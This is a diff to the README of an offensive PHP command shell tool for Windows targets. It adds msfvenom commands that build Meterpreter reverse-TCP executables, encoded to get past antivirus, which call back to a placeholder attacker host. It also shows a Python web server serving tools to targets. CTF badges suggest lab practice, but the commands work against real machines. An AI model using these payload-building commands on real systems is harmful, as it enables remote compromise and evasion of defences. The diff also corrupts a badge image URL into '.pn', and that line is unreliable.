@@ -12,7 +12,11 @@ Automates or simplifies many on target functions. Designed for windows targets. 
 
 venom.exe : 
 ```sh
-sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e shikata_ga_nai -f exe -o venom.exe`
+```
+windows x64 venom.exe :
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACKBOXPORT) -e x64/xor_dynamic -i 10 -f exe -o venom64.exe
 ```
 If you would prefer to use a payload generator, please give mine a try https://github.com/kaotickj/K-Sploit
 ![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)
@@ -71,4 +75,4 @@ cd windowstools
 python3 -m http.server 8000
 ```
 ![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png)
-![Hack The Box](http://www.hackthebox.eu/badge/image/476578)  ![Try Hack Me Box](https://tryhackme-badges.s3.amazonaws.com/kaotickj.png)
+![Hack The Box](http://www.hackthebox.eu/badge/image/476578)  ![Try Hack Me Box](https://tryhackme-badges.s3.amazonaws.com/kaotickj.pn)
